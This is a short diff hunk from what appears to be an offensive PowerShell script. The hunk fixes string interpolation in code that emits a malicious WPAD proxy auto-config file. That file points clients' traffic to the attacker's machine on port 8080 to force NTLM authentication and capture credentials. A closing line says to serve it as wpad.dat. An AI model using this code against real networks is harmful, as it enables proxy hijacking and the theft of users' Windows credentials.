@@ -2053,7 +2053,7 @@ Write-Output ""
 $localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress
 Write-Output "function FindProxyForURL(url, host) {"
 Write-Output "    // Force NTLM auth to attacker proxy"
-Write-Output "    return 'PROXY ${localIp}:8080; DIRECT';"
+Write-Output "    return 'PROXY $($localIp):8080; DIRECT';"
 Write-Output "}"
 Write-Output ""
 Write-Output "[*] Serve this PAC file at: http://$localIp/wpad.dat"
